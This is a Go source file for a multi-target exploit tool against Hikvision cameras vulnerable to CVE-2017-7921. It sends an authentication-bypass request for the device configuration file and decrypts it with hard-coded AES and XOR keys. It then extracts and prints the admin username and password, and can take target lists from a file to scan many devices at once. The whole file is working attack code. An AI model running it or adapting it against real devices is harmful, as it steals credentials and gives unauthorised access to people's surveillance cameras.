package main

import (
	"bytes"
	"crypto/aes"
	"encoding/hex"
	"errors"
	"flag"
	"fmt"
	"io/ioutil"
	"main/src/gip"
	"os"
	"regexp"
	"runtime"
	"strings"
	"sync"

	"github.com/levigross/grequests"
)

type paramStruct struct {
	target     string
	thread     int
	exploit    bool
	bruteforce bool
	username   string
	password   string
}

// ZeroPadding pads byte array to block size with zero
func ZeroPadding(data []byte, blockSize int) []byte {
	padding := blockSize - len(data)%blockSize
	padText := bytes.Repeat([]byte{0}, padding)
	return append(data, padText...)
}

// ZeroUnPadding removes zero padding
func ZeroUnPadding(data []byte) ([]byte, error) {
	padding := 0
	length := len(data)
	if length == 0 {
		return nil, errors.New("cannot remove padding for zero length byte array")
	}
	for i := length - 1; i >= 0; i-- {
		// byte is same to int8, stands for ascii code
		if data[i] == 0 {
			padding++
		} else {
			break
		}
	}
	return data[:length-padding], nil
}

// AesEncrypt function encrypt plaintext by aes CBC mode
func AesEncrypt(plainText []byte, key []byte) []byte {
	block, _ := aes.NewCipher(key)
	blockSize := block.BlockSize()
	plainTextPadding := ZeroPadding(plainText, blockSize)

	cipherByte := make([]byte, len(plainTextPadding))
	for start, end := 0, blockSize; start < len(plainTextPadding); start, end = start+blockSize, end+blockSize {
		block.Encrypt(cipherByte[start:end], plainTextPadding[start:end])
	}

	return cipherByte
}

// AesDecrypt function decrypt plaintext by AES CBC mode
func AesDecrypt(cipherText []byte, key []byte) []byte {
	// create an AES instance
	block, _ := aes.NewCipher(key)
	blockSize := block.BlockSize()

	cipherText = ZeroPadding(cipherText, blockSize)
	plainByte := make([]byte, len(cipherText))
	for start, end := 0, blockSize; start < len(cipherText); start, end = start+blockSize, end+blockSize {
		block.Decrypt(plainByte[start:end], cipherText[start:end])
	}

	plainByte, _ = ZeroUnPadding(plainByte)
	return plainByte
}

// xore function returns the xor value of data and cycle key
func xore(data []byte, key []byte) []byte {
	var result []byte
	for i := 0; i < len(data); i++ {
		result = append(result, data[i]^key[i%len(key)])
	}
	return result
}

// FilterStrings function filters all printable strings whose length is more than 2
func FilterStrings(data string) []string {
	printableChars := `A-Za-z0-9/\-:.,_$%'()[\]<> `
	shortestReturnChar := 2
	regExp := fmt.Sprintf("[%s]{%d,}", printableChars, shortestReturnChar)
	pattern := regexp.MustCompile(regExp)

	return pattern.FindAllString(data, -1)
}

// AllIndexOf function returns indexes whose value is same to keyWord
func AllIndexOf(data []string, keyWord string) []int {
	var indexList []int
	for i, v := range data {
		if strings.Compare(v, keyWord) == 0 {
			indexList = append(indexList, i)
		}
	}
	return indexList
}

// exploit function decrypt config file of vulerable hikvision devices,
// for getting username and password.
// It gets two parameters:
//	1. An IP address
//	2. Instance pointer of `sync.WaitGroup`
// If you do not intend to use the `sync.WaitGroup` you can just pass nil
func exploit(target string, wg *sync.WaitGroup) {
	defer func() {
		if wg != nil {
			wg.Done()
		}
	}()

	baseURL := "http://%s/System/configurationFile?auth=YWRtaW46MTEK"
	aesKey, _ := hex.DecodeString("279977f62f6cfd2d91cd75b889ce0c9a")
	// ro := &grequests.RequestOptions{RequestTimeout: 5}
	xorKey := []byte{0x73, 0x8B, 0x55, 0x44}
	url := fmt.Sprintf(baseURL, target)
	res, _ := grequests.Get(url, nil)
	if res.Ok {
		// grequest abstract the Go http.Response object
		content, _ := ioutil.ReadAll(res.RawResponse.Body)
		content = AesDecrypt(content, aesKey)
		resultList := FilterStrings(string(xore(content, xorKey)))
		index := AllIndexOf(resultList, "admin")
		if len(index) == 0 {
			fmt.Printf("[-] %-20s- The target does NOT appear vulerable.\n", target)
			return
		}
		username := resultList[index[len(index)-1]]
		password := resultList[index[len(index)-1]+1]
		fmt.Printf("[+] %-20s- The target is vulnerable. Username: %s  Password: %s\n", target, username, password)
	}
	res.Close()
}

// InvokExploit uses multithread to invoke exploit function
func InvokExploit(targetList []string) {
	wg := sync.WaitGroup{}
	for i := 0; i < len(targetList); i++ {
		wg.Add(1)
		go exploit(targetList[i], &wg)
	}
	wg.Wait()
}

func paramInit() paramStruct {
	var param paramStruct

	flag.StringVar(&param.target, "t", "", "Exploit target, ip:port or file path, example: 127.0.0.1 or ./targets.txt")
	flag.IntVar(&param.thread, "thread", 1, "The number of concurrent threads, default 1")
	flag.BoolVar(&param.exploit, "e", true, "Use cve-2017-7921 exploit model(true of false), default true")
	flag.BoolVar(&param.bruteforce, "b", false, "Use burte force model(true or false), default false")
	flag.StringVar(&param.username, "username", "admin", "Set the username if using burte force model, or username file path, defult 'admin'")
	flag.StringVar(&param.password, "password", "12345", "Set the password if using burte force model, or password file path, defult '12345'")

	flag.Parse()
	return param
}

// PathFileExists checks if path is existential
func PathFileExists(path string) (bool, error) {
	_, err := os.Stat(path)
	if err == nil {
		return true, nil
	}
	if os.IsNotExist(err) {
		return false, err
	}
	return false, err
}

func paramToList(target string) ([]string, error) {
	// ip format pattern
	pattern := `\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}`
	regExp := regexp.MustCompile(pattern)
	// param target is ip address format
	if regExp.Match([]byte(target)) {
		return gip.GetIPSubnet(target, 32)
	}

	// param target is file path
	isExist, err := PathFileExists(target)
	if isExist {
		content, _ := ioutil.ReadFile(target)
		result := strings.Replace(string(content), "\r", "", -1)
		return strings.Split(result, "\n"), nil
	}
	return nil, err
}

func main() {
	param := paramInit()
	runtime.GOMAXPROCS(param.thread)
	targetList, err := paramToList(param.target)
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
	if param.exploit {
		InvokExploit(targetList)
	}
	fmt.Print("finish!")
}
